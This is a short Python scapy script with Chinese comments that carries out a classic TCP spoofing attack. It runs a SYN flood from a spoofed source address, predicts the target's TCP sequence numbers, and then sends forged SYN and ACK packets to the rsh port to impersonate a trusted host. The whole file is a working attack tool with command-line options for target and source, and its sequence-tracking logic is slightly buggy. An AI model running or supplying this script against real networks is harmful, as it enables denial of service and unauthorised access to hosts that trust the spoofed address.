from scapy.all import *
import optparse

# SYN 洪水
def synFood(src,tgt,dport):
    for sport in range(1024,65535):
        Iplayer=IP(src=src,dst=tgt)
        TCPlayer =TCP(sport=sport,dport=dport)
        pkt= Iplayer / TCPlayer
        send(pkt)

#预测TCP 序列号
def callTSN(tgt):
    seqNum=0
    preNum=0
    diffSeq=0
    for x in range(1,5):
        if preNum !=0:
            preNum =seqNum
        pkt=IP(dst=tgt)/TCP()
        ans=sr1(pkt,verbose=0)
        seqNum=ans.getlayer(TCP).seq
        diffSeq=seqNum-preNum
        print("[+] TCP Seq difference:"+str(diffSeq))
    return seqNum+diffSeq

# 发送ACK欺骗包
def spoofConn(src,tgt,ack,port):
    IPlayer=IP(src=src,dst=tgt)
    TCPlayer =TCP(sport=port,dport=514)
    synPkt=IPlayer /TCPlayer
    send(synPkt)
    IPlayer=IP(src=src,dst=tgt)
    TCPlayer =TCP(sport=port,dport=514,ack=ack)
    ackPkt=IPlayer /TCPlayer
    send (ackPkt)

def main():
    parser=optparse.OptionParser("using %prog -s <specifc src for SYN Flood> -S <'specify src for spoofed connection> -t <'specify targetaddress> -p <target port>")
    parser.add_option("-s",dest="synSpoof",type="string", help="specifc src for SYN Flood")
    parser.add_option("-S",dest="srcSpoof",type="string", help="specify src for spoofed connection")
    parser.add_option("-t",dest="dip",type="string", help="target IP")
    parser.add_option("-p",dest="port",type="int", help="target port")
    (opt,args)=parser.parse_args()
    if opt.synSpoof == None or opt.srcSpoof == None or opt.dip ==None :
        print(parser.usage)
        exit(0)
    if opt.port == None:
        opt.port=513
    print(opt)
    synFood(opt.synSpoof,opt.srcSpoof,opt.port)
    seqNum=callTSN(opt.dip)+1
    print("[+] NextTCP Sequence Number to ACK iS "+ str(seqNum))
    spoofConn(opt.srcSpoof,opt.dip,seqNum,opt.port)
    
if __name__ == "__main__":
    main()
    


